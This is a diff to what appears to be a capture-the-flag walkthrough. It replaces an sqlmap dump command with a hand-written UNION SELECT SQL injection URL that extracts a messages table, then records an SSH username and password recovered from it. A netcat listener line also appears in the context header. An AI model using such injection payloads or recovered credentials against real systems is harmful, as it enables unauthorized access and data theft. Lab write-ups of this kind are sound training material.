@@ -154,14 +154,15 @@ nc -lvkp <port>
 
 items,messages,users
 table users: id, isAdministrator,password,username
+table messages: id,is_read,message_content,user_from,user_to
 
 ![alt text](image-12.png)
 
 ```bash
-sqlmap -r request.txt --dbms=mysql --dump
-# -r uses the intercepted request you saved earlier
-# --dbms tells SQLMap what type of database management system it is
-# --dump attempts to outputs the entire database
-```
+http://<IP>/admin?user=5%20UNION%20SELECT%20group_concat(id,%20%27:%27%20,%20is_read,%20%27:%27%20,%20message_content,%20%27:%27%20,%20user_from,%20%27:%27%20,%20user_to%20SEPARATOR%20%27%3Cbr%3E%27),2,3,4%20FROM%20messages
 
+```
+![alt text](image-13.png)
+
+--> We have the credential SSH jake:@b_ENXkGYUCAv3zJ
 
